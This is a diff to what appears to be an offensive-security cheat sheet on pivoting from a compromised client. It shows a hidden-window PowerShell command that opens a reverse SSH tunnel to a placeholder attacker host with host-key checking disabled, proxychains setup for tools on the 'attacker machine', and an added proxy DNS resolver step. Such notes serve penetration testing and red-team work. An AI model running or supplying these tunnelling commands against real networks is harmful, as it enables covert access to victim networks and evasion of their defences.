@@ -1,4 +1,4 @@
-### Start ssh connection from compromised client to ssh server
+### Start ssh connection on compromised client
 ```
 Start-Process -FilePath "powershell" -ArgumentList " -w hidden -c ssh -p 22 -o 'StrictHostKeyChecking=no' -i $HOME\.ssh\<privateKey> -N -R 9050 <user>@<sshRhost>"
 ```
@@ -26,5 +26,10 @@ sed -i 's/ 9050/ 9051/g' /etc/proxychains4.conf
 ### Execute tools on attacker machine
 ```
 proxychains firefox
+```
+
+### Add DNS resolver to proxy
+```
+/usr/lib/proxychains3/proxyresolv
 ```
 
